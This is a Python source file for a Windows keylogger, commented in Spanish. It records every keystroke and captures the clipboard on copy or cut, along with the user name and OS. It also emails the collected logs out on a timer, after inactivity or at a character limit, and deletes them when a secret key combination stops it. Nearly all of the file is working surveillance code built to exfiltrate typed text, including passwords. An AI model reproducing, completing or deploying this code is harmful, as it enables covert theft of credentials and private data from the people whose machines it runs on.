
# Imports
from json_manager import LeerJSON
from email_manager import Enviar_Email
from datetime import datetime
from pynput import keyboard
from ctypes import WinDLL
from platform import system, release
from pyperclip import paste
from os import getlogin, remove
from time import sleep
from threading import Thread

# Class KeyLogger
class KeyLogger:

    # Constructor
    def __init__(self, ruta_config: str):
        self.__leerJson = LeerJSON(ruta_json=ruta_config)
        self.__correo = None
        self.__ruta_config = ruta_config
        self.__nombre_log_pulsaciones = self.__leerJson.get_valor("nombre_log_pulsaciones")
        self.__nombre_log_portapapeles = self.__leerJson.get_valor("nombre_log_portapapeles")
        self.__enviar_hora_programada = self.__leerJson.get_valor("hora_programada")
        self.__horas_inactivo = self.__leerJson.get_valor("horas_inactivo")
        self.__minutos_inactivo = self.__leerJson.get_valor("minutos_inactivo")
        self.__segundos_inactivo = self.__leerJson.get_valor("segundos_inactivo")
        self.__tiempo_reenviar_correo = self.__leerJson.get_valor("tiempo_reenviar_correo")
        self.__cantidad_maxima_caracteres = self.__leerJson.get_valor("caracteres_maximos")
        self.__nombre_sesion = getlogin()
        self.__sistema = f"{system()} {release()}"
        self.__ruta_log = self.__leerJson.get_valor("ruta_log")
        self.__ruta_log_pulsaciones = ""
        self.__ruta_log_portapapeles = ""
        self.__fecha_inicio = ""
        self.__hora_inicio = ""
        self.__cabecera = ""
        self.__id_portapapeles = 0
        self.__caracteres_cabecera = 0
        self.__caracteres_log = 0
        self.__hora_actual = 0
        self.__minuto_actual = 0
        self.__segundo_actual = 0
        self.__enviar_alas_hora = 0
        self.__enviar_alas_minuto = 0
        self.__enviar_alas_segundo = 0
        self.__estado_hora_programada = False
        self.__horas_restantes = 0
        self.__minutos_restantes = 0
        self.__segundos_restantes = 0
        self.__corriendo = None
        self.__listener = None
        self.__shift_presionado = False
        self.__control_presionado = False
        self.__alt_presionado = False
        self.__fn_presionado = False
        self.__estado_capslock = False
        self.__estado_numlock = False
        self.__lista_combinacion = []
        self.__fin_script = f"\n\____/\ \n/\  /\ \n-byRyanAg..."
        self.__diccionario_especial = {
            "Key.f1": " <F1> ", "Key.f2": " <F2> ", "Key.f3": " <F3> ", "Key.f4": " <F4> ",
            "Key.f5": " <F5> ", "Key.f6": " <F6> ", "Key.f7": " <F7> ", "Key.f8": " <F8> ",
            "Key.f9": " <F9> ", "Key.f10": " <F10> ", "Key.f11": " <F11> ", "Key.f12": " <F12> ",

            "Key.media_volume_mute": " <MUTE> ",
            "Key.media_volume_down": " <VOLUMEN - > ",
            "Key.media_volume_up": "<VOLUMEN + >",
            "Key.esc": " <ESC> ",
            "Key.left": " <- ",
            "Key.right": " -> ",
            "Key.up": " <UP> ",
            "Key.down": " <DOWN> ",
            "Key.delete": " <DELETE> ",
            "Key.home": " <HOME> ",
            "Key.insert": " <INSERT> ",
            "Key.end": " <END> ",
            "Key.tab": "\t",
            "Key.enter": "\n",
            "Key.space": " ",
            "Key.page_up": " <PAGE_UP> ",
            "Key.page_down": " <PAGE_DOWN> ",
            "Key.print_screen": " <PRINT_SCREEN> ",
            "Key.cmd": " <WIN> ",
            
            "<12>": " <NUMLOCK: 5> ",
            "<96>": "0", "<97>": "1", "<98>": "2", "<99>": "3", "<100>": "4",
            "<101>": "5", "<102>": "6", "<103>": "7", "<104>": "8", "<105>": "9",
            "<110>": "."
        }

        self.__diccionario_combinaciones = {
            "\\x01": " <CONTROL + A> ",
            "\\x02": " <CONTROL + B> ",
            "\\x03": " <CONTROL + C> ",
            "\\x04": " <CONTROL + D> ",
            "\\x05": " <CONTROL + E> ",
            "\\x06": " <CONTROL + F> ",
            "\\x07": " <CONTROL + G> ",
            "\\x08": " <CONTROL + H> ",
            "\\t": " <CONTROL + I> ",
            "\\n": " <CONTROL + J> ",
            "\\x0b": " <CONTROL + K> ",
            "\\x0c": " <CONTROL + L> ",
            "\\r": " <CONTROL + M> ",
            "\\x0e": " <CONTROL + N> ",
            "\\x0f": " <CONTROL + O> ",
            "\\x10": " <CONTROL + P> ",
            "\\x11": " <CONTROL + Q> ",
            "\\x12": " <CONTROL + R> ",
            "\\x13": " <CONTROL + S> ",
            "\\x14": " <CONTROL + T> ",
            "\\x15": " <CONTROL + U> ",
            "\\x16": " <CONTROL + V> ",
            "\\x17": " <CONTROL + W> ",
            "\\x18": " <CONTROL + X> ",
            "\\x19": " <CONTROL + Y> ",
            "\\x1a": " <CONTROL + Z> ",
            "<187>": " <CONTROL +> ",
            "<189>": " <CONTROL -> "
        }

    # Iniciar KL
    def iniciar_primer_plano(self):

        # Verificar si Ya Esta Corriendo
        if self.__corriendo:
            print("[!] Ya se esta Ejecutando")
            return

        # Iniciar KL
        print("~~~ KL Iniciado ~~~")
        self.__corriendo = True

        # Modo Hora Programada
        if self.__horas_inactivo == 0 and self.__minutos_inactivo == 0 and self.__segundos_inactivo == 0:
            self.__estado_hora_programada = True
            self.__calcular_horas_restantes()
            print(f"[+] Enviar en Hora Programada [Activada]")
            print(f"[+] Se Enviara a las: {self.__enviar_hora_programada[0]}h:{self.__enviar_hora_programada[1]}m:{self.__enviar_hora_programada[2]}s")
            print(f"[+] Faltan {self.__horas_restantes}h:{self.__minutos_restantes}m:{self.__segundos_restantes}s")

        # Modo Inactividad
        else:
            print(f"[+] Se Enviara Cada: {self.__horas_inactivo}h:{self.__minutos_inactivo}m:{self.__segundos_inactivo}s")

        # Modo Caracteres Maximos
        if self.__cantidad_maxima_caracteres > 0:
            print(f"[+] Se Enviara un Correo al Llegar a {self.__cantidad_maxima_caracteres} Caracteres")

        # Obtener Estado de CAPSLOCK y NUMLOCK
        self.__estado_capslock = self.__is_key_on(0x14)
        self.__estado_numlock = self.__is_key_on(0x90)

        # Obtener Hora de Inicio
        self.__fecha_inicio = datetime.today().strftime("%d-%m-%y")
        self.__hora_inicio = datetime.today().strftime("%H:%M:%S")

        # Crear Cabecera
        caracteres_cabecera = len(f"{self.__nombre_sesion} {self.__fecha_inicio} {self.__hora_inicio} {self.__sistema}")
        self.__cabecera = f"{self.__nombre_sesion} {self.__fecha_inicio} {self.__hora_inicio} {self.__sistema}\n{"-" * caracteres_cabecera}\n"
        self.__caracteres_cabecera = len(self.__cabecera)

        # Crear Nombre Log Pulsaciones
        if self.__nombre_log_pulsaciones == "": # Usar Nombre Predeterminado
            self.__nombre_log_pulsaciones = f"key-log_{self.__nombre_sesion.replace(" ","_")}.txt"
            print(f"[+] Nombre Log Pulsaciones Vacio, Usando Predeterminado: {self.__nombre_log_pulsaciones}")
        else: # Usar Nombre Desde el JSON
            self.__nombre_log_pulsaciones = f"{self.__nombre_log_pulsaciones}.txt"
            print(f"[+] Nombre Log Pulsaciones Asignado Manualmente: {self.__nombre_log_pulsaciones}")

        # Crear Nombre Log Portapapeles
        if self.__nombre_log_portapapeles == "": # Usar Nombre Predeterminado
            self.__nombre_log_portapapeles = "key-log_ClipBoard.txt"
            print(f"[+] Nombre Log Portapapeles Vacio, Usando Predeterminado: {self.__nombre_log_portapapeles}")
        else: # Usar Nombre Desde el JSON
            self.__nombre_log_portapapeles = f"{self.__nombre_log_portapapeles}.txt"
            print(f"[+] Nombre Log Portapapeles Asignado Manualmente: {self.__nombre_log_portapapeles}")

        # Crear Ruta logs
        self.__ruta_log_pulsaciones = f"{self.__ruta_log.replace("%username%",self.__nombre_sesion)}{self.__nombre_log_pulsaciones}"
        self.__ruta_log_portapapeles = f"{self.__ruta_log.replace("%username%", self.__nombre_sesion)}{self.__nombre_log_portapapeles}"

        # Abrir Log Pulsaciones Existente
        try:

            # Obtener Caracteres del Log Pulsaciones
            with open(self.__ruta_log_pulsaciones, "r") as log:
                self.__caracteres_log = len(log.read())

            # Verificar si esta Vacio
            if self.__caracteres_log == self.__caracteres_cabecera:
                print("[-] Log Pulsaciones Vacio, Eliminando Logs Vacios...")
                logs = [
                    (self.__ruta_log_pulsaciones, "Log Pulsaciones"),
                    (self.__ruta_log_portapapeles, "Log Portapapeles")
                ]
                for ruta, nombre in logs:
                    try:
                        remove(ruta)
                    except FileNotFoundError:
                        print(f"[!] No se Encontro {nombre}")
                print("[+] Logs Eliminados Correctamente")

                # Crear Log Pulsaciones Nuevo
                print("[-] Creando Nuevo Log Pulsaciones...")
                log = open(self.__ruta_log_pulsaciones, "x")
                log.close()
                self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=f"{self.__cabecera}")
                print("[+] Log Pulsaciones Creado Correctamente")
            
            # Agregar Contenido al Final si ya hay Algo Escrito
            else:
                print("[-] Archivo Pulsaciones Detectado, Se Continuara con el Archivo Existente...")
                self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=f"\n\n{self.__cabecera}") # 2 Saltos de Linea para Separar Contenido Anterior

                # Obtener Carcateres Log
                with open(self.__ruta_log_pulsaciones, "r") as log:
                    self.__caracteres_log = len(log.read())
                    print(f"[+] Cargado Correctamente. Numero de Caracteres: {self.__caracteres_log}")

        # Crear Log SINO EXISTE
        except FileNotFoundError:
            print("[-] Archivo Pulsaciones No Encontrado, Creando uno Nuevo...")
            log = open(self.__ruta_log_pulsaciones, "x")
            log.close()
            print("[+] Log Pulsaciones Creado Correctamente")
            self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=f"{self.__cabecera}")

        # Ultimos Procesos
        finally:
            self.__correo = Enviar_Email(ruta_config=self.__ruta_config, ruta_log_pulsaciones=self.__ruta_log_pulsaciones, ruta_log_portapapeles=self.__ruta_log_portapapeles)
            print("[+] Todo Listo...")
            print("~~~~~~~~~~~~~~~~~~~")

        # Imprimir Cabecera
        print(self.__cabecera)

        # Iniciar Listener
        self.__listener = keyboard.Listener(
            on_press=self.__presionar_tecla,
            on_release=self.__soltar_tecla
        ).start()

        # Correr Mientras este Activo
        while(self.__corriendo):
            sleep(1)
            self.__verificar_hora_envio()

    # Inicar KL en Segundo PLano
    def iniciar_segundo_plano(self):
        hilo = Thread(target=self.iniciar_primer_plano)
        hilo.start()

    # Ver Estado de Teclas Windows
    def __is_key_on(self, hex: int) -> bool:
        if WinDLL("User32.dll").GetKeyState(hex):
            return True
        return False
    
    # Reiniciar Contador Inactividad
    def __reiniciar_inactividad(self):

        # Obtener Hora Actual
        self.__enviar_alas_hora = int(datetime.today().strftime("%H"))
        self.__enviar_alas_minuto = int(datetime.today().strftime("%M"))
        self.__enviar_alas_segundo = int(datetime.today().strftime("%S"))

        # Sumar Tiempo de Inactividad
        self.__enviar_alas_hora += self.__horas_inactivo
        self.__enviar_alas_minuto += self.__minutos_inactivo
        self.__enviar_alas_segundo += self.__segundos_inactivo

        # Verificar que no Pase de 60 Segundos
        if self.__enviar_alas_segundo >= 60:
            self.__enviar_alas_segundo -= 60
            self.__enviar_alas_minuto += 1

        # Verificar que no Pase de 60 Minutos
        if self.__enviar_alas_minuto >= 60:
            self.__enviar_alas_minuto -= 60
            self.__enviar_alas_hora += 1

        # Verificar que no Pase de 60 Horas
        if self.__enviar_alas_hora >= 60:
            self.__enviar_alas_hora -= 60

        print(f"[+] Se Enviara Correo a las {self.__enviar_alas_hora}h:{self.__enviar_alas_minuto}m:{self.__enviar_alas_segundo}s")

    # Verificar si ya es Hora de Enviar Correo
    def __verificar_hora_envio(self):

        # Obtener Hora Actual
        self.__hora_actual = int(datetime.today().strftime("%H"))
        self.__minuto_actual = int(datetime.today().strftime("%M"))
        self.__segundo_actual = int(datetime.today().strftime("%S"))
        
        # Modo: Enviar por Inactividad
        if (self.__hora_actual == self.__enviar_alas_hora and
            self.__minuto_actual == self.__enviar_alas_minuto and
            self.__segundo_actual == self.__enviar_alas_segundo and
            not self.__estado_hora_programada):
                print("[!] Se Enviara Correo por Inactividad")
                self.__enviar_correo(mensaje_enviado="[+] Correo por Inactividad Enviado")
                self.__enviar_alas_segundo = 0
                self.__enviar_alas_minuto = 0
        
        # Modo: Enviar en Hora programada
        elif self.__estado_hora_programada:
            if (self.__hora_actual == self.__enviar_hora_programada[0] and
                self.__minuto_actual == self.__enviar_hora_programada[1] and
                self.__segundo_actual == self.__enviar_hora_programada[2]):
                    print("[!] Se Enviara Correo en la Hora Programada")
                    self.__enviar_correo(mensaje_enviado="[+] Correo Enviado a la Hora Programada. Se Enviara de Nuevo en 24h")

        # Modo: Caracteres Maximos (Solo Numeros Positivos)
        if self.__cantidad_maxima_caracteres > 0:

            if self.__caracteres_log >= self.__cantidad_maxima_caracteres:
                self.__enviar_correo(mensaje_enviado="[+] Limite De Caracteres Alcanzado, Correo Enviado")

    # Enviar Correo
    def __enviar_correo(self, mensaje_enviado: str):

        # NO ENVIAR si Logs estan Vacios
        if self.__caracteres_log == self.__caracteres_cabecera:
            print("[!] Logs Vacios, No se Enviara Correo")
            return

        # Enviar Hasta que Servidor Regrese Respuesta
        correo_enviado = False
        while(not correo_enviado and self.__corriendo):
            correo_enviado = self.__correo.enviar_correo(mensaje_enviado=mensaje_enviado)

            # En Caso que Falle Esperar Tiempo Hasta Volver a Enviar
            if not correo_enviado:
                print(f"[!] Reenviando Correo en {self.__tiempo_reenviar_correo}s...")
                sleep(self.__tiempo_reenviar_correo)

        # Limpiar Log Principal y Agregar Cabecera
        with open(self.__ruta_log_pulsaciones, "w+") as log:
            print("[+] Se Limpio el log Pulsaciones")

            # Obtener Hora de Inicio
            self.__fecha_inicio = datetime.today().strftime("%d-%m-%y")
            self.__hora_inicio = datetime.today().strftime("%H:%M:%S")

            # Reiniciar Cabecera
            caracteres_cabecera = len(f"{self.__nombre_sesion} {self.__fecha_inicio} {self.__hora_inicio} {self.__sistema}")
            self.__cabecera = f"{self.__nombre_sesion} {self.__fecha_inicio} {self.__hora_inicio} {self.__sistema}\n{"-" * caracteres_cabecera}\n"
            log.write(self.__cabecera) # Agregar Cabecera
            log.seek(0) # Ir a Inicio del Archivo
            self.__caracteres_log = len(log.read()) # Obtener Caracteres

        # Limpiar Log Secundario
        with open(self.__ruta_log_portapapeles, "w") as log:
            print("[+] Se Limpio el log Portapapeles")

    # Calcular Horas Restantes del Envio
    def __calcular_horas_restantes(self):

        # Obtener Hora Actual
        hora_actual = int(datetime.today().strftime("%H"))
        minuto_actual = int(datetime.today().strftime("%M"))
        segundo_actual = int(datetime.today().strftime("%S"))
        
        # Obtener Hora Programada
        hora_programada = self.__enviar_hora_programada[0]
        minuto_programado = self.__enviar_hora_programada[1]
        segundo_programado = self.__enviar_hora_programada[2]
        
        # Calcular Tiempo Actual y Programado en Segundos
        tiempo_actual = hora_actual * 3600 + minuto_actual * 60 + segundo_actual # Convertir Hora Actual a Segundos Segundos
        tiempo_programado = hora_programada * 3600 + minuto_programado * 60 + segundo_programado # Convertir Fecha Programada a Segundos
        
        # Calcular Diferencia
        if tiempo_programado > tiempo_actual:

            # La Hora Programada es Hoy
            diferencia_segundos = tiempo_programado - tiempo_actual

        # La Hora Programada es Mañana (24 Horas Despues)
        else:
            diferencia_segundos = (24 * 3600) - (tiempo_actual - tiempo_programado)
        
        # Convertir a Horas, Minutos y Segundos
        self.__horas_restantes = diferencia_segundos // 3600
        self.__minutos_restantes = (diferencia_segundos % 3600) // 60
        self.__segundos_restantes = diferencia_segundos % 60

    # Evento Presionar Tecla
    def __presionar_tecla(self, key):

        # Parsear Key a Sring
        self.key_str = str(key).replace("'","") # Eliminar Comillas

        # Verificar si Mantiene SHIFT
        if self.key_str in ["Key.shift","Key.shift_r"] and not self.__shift_presionado:
            self.__shift_presionado = True
            print("Shift Presionado")
            return

        # Verificar si Mantiene CONTROL
        if self.key_str in ["Key.ctrl_l", "Key.ctrl_r"] and not self.__control_presionado:
            self.__control_presionado = True
            print("Control Presionado")
            return

        # Verificar si Mantiene ALT
        if self.key_str in ["Key.alt_l", "Key.alt_gr"] and not self.__alt_presionado:
            self.__alt_presionado = True
            print("Alt Presionado")
            return

        # Verificar si Mantiene FN (Solo Laptop)
        if self.key_str == "<255>" and not self.__fn_presionado:
            self.__fn_presionado = True
            print("FN Presionado")
            return

        # Combinacion para Detener Script (Control + Shift + Alt + F8)
        if self.__shift_presionado and self.__control_presionado and self.__alt_presionado and self.key_str == "Key.f8":
            print("[!] Combinacion de Cierre, Deteniendo Script...")
            self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.__fin_script)

            # Enviar Correo
            print("[-] Enviando Correo...")
            self.__enviar_correo(mensaje_enviado="[+] Correo Enviado Correctamente")

            # Eliminar Logs
            print("[-] Eliminando Logs...")
            logs = [
                (self.__ruta_log_pulsaciones, "Log Pulsaciones"),
                (self.__ruta_log_portapapeles, "Log Portapapeles"),
            ]
            for ruta, nombre in logs:
                try:
                    remove(ruta)
                except FileNotFoundError:
                    print(f"[!] No Existe {nombre}")
            print("[+] Logs Eliminados Correctamente")

            # Finalizar KL
            print(self.__fin_script)
            self.__corriendo = False
            return False

        # Verificar CONTROL + <-
        if self.__control_presionado and self.key_str == "Key.left":
            print(" <== ")
            self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=" <== ")
            return
        
        # Verificar CONTROL + ->
        if self.__control_presionado and self.key_str == "Key.right":
            print(" ==>")
            self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=" ==> ")
            return

        # Verificar CONTROL + BACKSPACE
        if self.__control_presionado and self.key_str == "Key.backspace":
            print(" <--1> ")
            self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=" <--1> ")
            return

        # Agregar Teclas Presionadas a Lista Combinacion si Alt esta Presionado
        if self.__alt_presionado:
            self.__lista_combinacion.append(self.key_str)

        # Verificar si esta en Diccionario de Teclas Especiales
        if self.key_str in self.__diccionario_especial:

            # Verificar si NO Esta Presionado Alt y esta en Diccionario Especial, Ignorar
            if not(self.key_str in self.__diccionario_especial and self.__alt_presionado):
                print(self.__diccionario_especial.get(self.key_str))
                self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.__diccionario_especial.get(self.key_str))

        # Verificar si esta en Diccionario de Combinaciones Control
        elif self.key_str in self.__diccionario_combinaciones:
    
            # Omitir Combinaciones (Control + C) o (Control + X)
            if not (self.key_str == "\\x03" or self.key_str == "\\x18"):
                print(self.__diccionario_combinaciones.get(self.key_str))
                self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.__diccionario_combinaciones.get(self.key_str))
        
        # Cualquier Otra Tecla
        else:

            # Verificar si es Letra
            if self.key_str.isalpha():

                if self.__estado_capslock and self.__shift_presionado:
                    print(f"Es la Letra: {self.key_str.lower()}.") # CapsLock + Shift
                    self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.key_str.lower())
                elif self.__estado_capslock:
                    print(f"Es la Letra: {self.key_str.upper()}.") # CapsLock
                    self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.key_str.upper())
                elif self.__shift_presionado:
                    print(f"Es la Letra: {self.key_str.upper()}.") # Shift
                    self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.key_str.upper())
                else:
                    print(f"Es la Letra: {self.key_str.lower()}.") # Ninguno
                    self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.key_str.lower())
            
            # Verificar si es Numero
            elif self.key_str.isnumeric():
                print(f"Numero: {self.key_str}")
                self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.key_str)

            # Verificar si es BACKSPACE
            elif self.key_str == "Key.backspace":
                print(" <-1> ")
                self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=" <-1> ")

            # Simbolo o Combinacion no Identificada
            else:
                print(self.key_str)
                self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.key_str)

        # Verificar que NO Este Hora Programada Activada
        if not self.__estado_hora_programada:

            # Reiniciar Contador de Inactividad
            self.__reiniciar_inactividad()

        # Mostrar Horas Restantes en Modo: Hora Programada
        else:
            self.__calcular_horas_restantes()
            print(f"[+] Faltan {self.__horas_restantes}h:{self.__minutos_restantes}m:{self.__segundos_restantes}s")

        # Mostrar Caracteres Actuales en Log
        with open(self.__ruta_log_pulsaciones, "r") as log:
            self.__caracteres_log = len(log.read())
            print(f"[+] Caracteres Actuales: {self.__caracteres_log}")
        
    # Evento Soltar Tecla
    def __soltar_tecla(self, key):

        # Parsear Key a Sring
        self.key_str = str(key).replace("'","")

        # Verificar si Suelta SHIFT
        if self.key_str in ["Key.shift", "Key.shift_r"]:
            self.__shift_presionado = False
            print("Shift Soltado")

        # Verificar si Suelta CONTROL
        if self.key_str in ["Key.ctrl_l", "Key.ctrl_r"]:
            self.__control_presionado = False
            print("Control Soltado")

        # Verificar si Suelta ALT
        if self.key_str in ["Key.alt_l", "Key.alt_gr"]:
            self.__alt_presionado = False
            print("Alt Soltado")

            # Verificar que solo Sean 2 Caracteres
            if len(self.__lista_combinacion) == 2:

                # Verificar que Combinacion sea [Right, Left] o [6,4]
                if (self.__lista_combinacion[0] == "Key.right" and self.__lista_combinacion[1] == "Key.left" or
                    self.__lista_combinacion[0] == "<102>" and self.__lista_combinacion[1] == "<100>"):
                        print("@")
                        self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido="@")
            self.__lista_combinacion.clear()

        # Verificar si Suelta FN
        if self.key_str == "<255>":
            self.__fn_presionado = False
            print("FN Soltado")
        
        # Verificar si Suelta CAPSLOCK
        if self.key_str == "Key.caps_lock":
            self.__estado_capslock = self.__is_key_on(0x14)
            print(f"CapsLock: {self.__estado_capslock}")
            
        # Verificar si Suelta NUMLOCK
        if self.key_str == "Key.num_lock":
            self.__estado_numlock = self.__is_key_on(0x90)
            print(f"NumLock: {self.__estado_numlock}")

        # Verificar si Suelta (Control + C) o (Control + X)
        if self.key_str == "\\x03" or self.key_str == "\\x18":

            # Obtener Texto Copiado
            texto_copiado = paste()
            print(f"Se Copio: {texto_copiado}")
            separador = "------------------------------"

            # Agregar Contenido a Logs
            self.__agregar_texto(ruta_log=self.__ruta_log_portapapeles, contenido=f"[{self.__id_portapapeles}]{separador}\n{texto_copiado}\n")
            self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=f" <ID_CLIPBOARD: {self.__id_portapapeles}> ")
            
            # Sumar Contador ID
            self.__id_portapapeles += 1

    # Agregar Contenido a Log
    def __agregar_texto(self, ruta_log: str, contenido: str):
        
        # Abrir TXT
        with open(ruta_log, "a") as log:
            log.write(contenido)

    #     \____/\
    #     /\  /\
    #    -byRyanAg...